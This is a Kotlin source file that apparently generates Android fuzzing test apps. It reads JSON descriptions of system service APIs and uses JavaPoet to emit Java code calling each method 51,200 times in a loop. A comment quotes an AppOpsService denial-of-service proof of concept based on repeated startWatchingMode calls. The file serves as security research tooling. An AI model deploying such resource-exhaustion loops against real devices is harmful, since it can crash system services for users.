package com.alienware.snk

import com.beust.klaxon.Klaxon
import com.squareup.javapoet.*
import ppg.code.Code
import java.io.File
import javax.lang.model.element.Modifier
import kotlin.collections.ArrayList
import kotlin.system.exitProcess


val BASE_DIR = "E:\\PaperWork\\JGRAnalyzer\\SourceAudit\\data\\fuzzy"
val JAVA_TMPL = "E:\\PaperWork\\JGRAnalyzer\\AppGen\\bin\\MyService.java"
val DEST_DIR = "E:\\PaperWork\\JGRAnalyzer\\AppGen\\class"

val PACKAGE = "com.autotest.gen"

//@Serializable
data class CallBackDesc(val cls_name:String, val methods: ArrayList<MethodDesc>)

//@Serializable
data class ParamTypeDesc(val param_name: String, val param_type: String, val param_ref: CallBackDesc?)

//@Serializable
data class MethodDesc(val method_name: String, val params: ArrayList<ParamTypeDesc>?, val return_type: ParamTypeDesc?)

//@Serializable
data class ApiDesc(val packages: ArrayList<String>, val method_ref: MethodDesc)

//@Serializable
data class ServiceManagerDesc(val service_name: String, val ctx_str: String, val api_list: ArrayList<ApiDesc>)


class Poet {
    init {

    }

    fun processAPIDesc() {
        File(BASE_DIR).listFiles().forEach {
            if (it.name.endsWith(".json")) {
                val txt = it.readText()
//                val obj = Json.parse(ServiceManagerDesc.serializer(), txt)
                val obj = Klaxon().parse<ServiceManagerDesc>(txt)
//                println(obj?.api_list)
                genApiList(obj!!)
//                return
            }
        }
    }

    fun genApiList(sv: ServiceManagerDesc) {
        val name = sv.service_name
        for (it in sv.api_list) {
            println(it)
            val mp = HashMap<String, String>()
            val mtd = it.method_ref.method_name
            val file_name = "${name}_${mtd}"
            mp["Package"] = "package $PACKAGE;\n"
            mp["Imports"] = it.packages.joinToString(separator = "") {
                "import $it;\n"
            }
            val api = genApi(name, sv.ctx_str, it)
            mp["Methods"] = api.toString()
//            println(api.toString())
//            println(mp)
            fillJavaTmp("$DEST_DIR\\$file_name.java", mp)
        }
//        genCodeForServiceManagerTest()
    }

    fun genApi(smr_name: String, ctx_str: String, api: ApiDesc): MethodSpec {
        val serviceManager = ClassName.get("", smr_name)
        val runLoop = MethodSpec.methodBuilder("runLoop")
                .addStatement("\$T serviceManager = (\$T) getSystemService(\$N)", serviceManager, serviceManager, ctx_str)
                .beginControlFlow("for (int i = 0; i < 51200; i++)")
                .beginControlFlow("try")
                .addCode(genSmrMethodCall(api.method_ref))
                .nextControlFlow("catch (\$T e)", Exception::class.java)
                .addStatement("e.printStackTrace()")
                .endControlFlow()
                .endControlFlow()
                .build()
        return runLoop
    }

    fun genSmrMethodCall(mtd: MethodDesc): CodeBlock {
        val params = genMethodParams(mtd)
        println("==========" + params)
        val block = CodeBlock.builder()
                .addStatement("serviceManager.\$L(\$L)", mtd.method_name, params)
        return block.build()
    }


    fun genMethodParams(mtd: MethodDesc): CodeBlock {
        val paramStr = ArrayList<String>()
        val args = ArrayList<Any>()
        mtd.params?.forEach {
            println(it.param_type + " " + it.param_name)
            if (it.param_ref is CallBackDesc) {
                paramStr.add("\$L")
                val cb = genCallbackParam(it.param_ref)
//                println(it)
//                println(cb)
                args.add(cb)
//                exitProcess(2)
            } else {
                when (it.param_type) {
                    "int", "float" -> {
                        paramStr.add("\$L")
                        args.add(1)
                    }
                    "String" -> {
                        paramStr.add("\$S")
                        if (it.param_name.contains("package")) {
                            args.add(PACKAGE)
                        } else {
                            args.add("android:coarse_location")
                        }
                    }
                    "List" -> {
                        paramStr.add("\$L")
                        args.add("new ArrayList<>()")
                    }
                    "boolean" -> {
                        paramStr.add("\$L")
                        args.add("false")
                    }
                    else -> { // new Object() or null
//                        println(it)
                        paramStr.add("\$L")
                        args.add("new ${it.param_type}()")
                    }

                }
            }
//            if (it.param_name == "callback") {
//                println(it)
////                exitProcess(-1)
//            }
        }
        val ps = paramStr.joinToString(", ")
        return CodeBlock.of(ps, *args.toArray())
    }

    fun genCallbackParam(param: CallBackDesc): String {
        val cls = ClassName.bestGuess(param.cls_name)
        val callback = TypeSpec.anonymousClassBuilder("")
                .addSuperinterface(cls)
        for (mtd in param.methods) {
            val ms = MethodSpec.methodBuilder(mtd.method_name)
                    .addModifiers(Modifier.PUBLIC)
                    .addAnnotation(ClassName.get("", "Override"))
            mtd.params?.forEach {
                ms.addParameter(ClassName.get("", it.param_type), it.param_name)
            }
            callback.addMethod(ms.build())
        }
        return callback.build().toString()
    }

    fun fillJavaTmp(sv: String, mp: Map<String, String>) {
        println("Save to: $sv")
        val outStr = StringBuilder()
        val reg = Regex("\\s*###\\{(\\w+)\\}")
        File(JAVA_TMPL).readLines().forEach {
            val mc = reg.matchEntire(it)
            if (mc != null) {
                val key = mc.groups[1]!!.value
//                println(reg.matches(it))
                if (mp.contains(key)) {
                    outStr.append( mp[key])
                } else {
                    println("Error: java template key $$key is not set!")
                }
            } else {
                outStr.appendln(it)
            }
        }
        File(sv).writeText(outStr.toString())
    }

    // https://juejin.im/entry/58fefebf8d6d810058a610de
    fun genCodeForServiceManagerTest(): MethodSpec {
        /*
            AppOpsManager manager = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
            IAppOpsService appOpsService = IAppOpsService.Stub.asInterface(ServiceManager.getService("appops"));
            for (int i = 0; i < 51200; i++) {
                try {
                    manager.startWatchingMode("android:coarse_location", "com.github.promeg.poc_appopsservice_dos", new AppOpsManager.OnOpChangedListener() {

                        @java.lang.Override
                        public void onOpChanged(String op, String packageName) {

                        }
                    });
                    Log.e("serviceOne", String.valueOf(i));
                    //appOpsService.startWatchingMode(1, "com.github.promeg.poc_appopsservice_dos", null);

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
         */
        val serviceManager = ClassName.get("", "AppOpsManager")
        val main = MethodSpec.methodBuilder("runLoop")
                // initial service manager
                .addStatement("\$T serviceManager = (\$T) getSystemService(\$N)", serviceManager, serviceManager, "Context.APP_OPS_SERVICE")
                .beginControlFlow("for (int i = 0; i < 51200; i++)")
                .beginControlFlow("try")
                // for-loop

                // call api
                .addCode(genServiceMethodCall())
                .nextControlFlow("catch (\$T e)", Exception::class.java)
                .addStatement("e.printStackTrace()")
                .endControlFlow()
                .endControlFlow()
                .build()
        print(main)
        print(ClassName.get("xyz.android.database", "Cursor"))
        return main
    }

    fun genServiceMethodCall(): CodeBlock {
        val args = createArgsForAPI()
        val block = CodeBlock.builder()
                .addStatement("manager.startWatchingMode(\$L)", args)
                .build()
//        print(block)
        return block
    }

    fun createArgsForAPI(): CodeBlock {
        val args = ArrayList<Any>()
        args.add("android:coarse_location")
        args.add("com.github.promeg.poc_appopsservice_dos")
        val cls = ClassName.bestGuess("AppOpsManager.OnOpChangedListener")
        val callback = TypeSpec.anonymousClassBuilder("")
                .addSuperinterface(cls)
                .addMethod(MethodSpec.methodBuilder("OnOpChanged")
//                        .addAnnotation(Override::class.java)
                        .addAnnotation(ClassName.get("", "Override"))
                        .addParameter(ClassName.bestGuess("String"), "op")
                        .addParameter(ClassName.bestGuess("String"), "packageName")
                        .build())
                .build()
        args.add(callback)

        val block = CodeBlock.of("\$S, \$S, \$L", *args.toArray())
        return block
    }
}